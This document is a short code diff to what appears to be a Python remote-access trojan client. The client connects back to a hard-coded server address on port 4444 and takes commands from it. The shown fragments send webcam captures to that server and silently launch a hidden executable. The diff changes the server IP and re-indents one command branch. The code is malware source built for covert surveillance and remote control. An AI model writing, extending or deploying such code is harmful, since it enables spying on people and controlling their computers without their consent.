@@ -6,7 +6,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.196.1"
+SERVER_IP = "192.168.206.1"
 SERVER_PORT = 4444
 
 if getattr(sys, 'frozen', False):
@@ -89,7 +89,7 @@ def handle_commands(client_socket):
                     if wait_for_file(latest_video):
                         send_file(client_socket, latest_video, "webcam_capture")
                 
-                elif command == "remote":
+            elif command == "remote":
                     subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
 
 
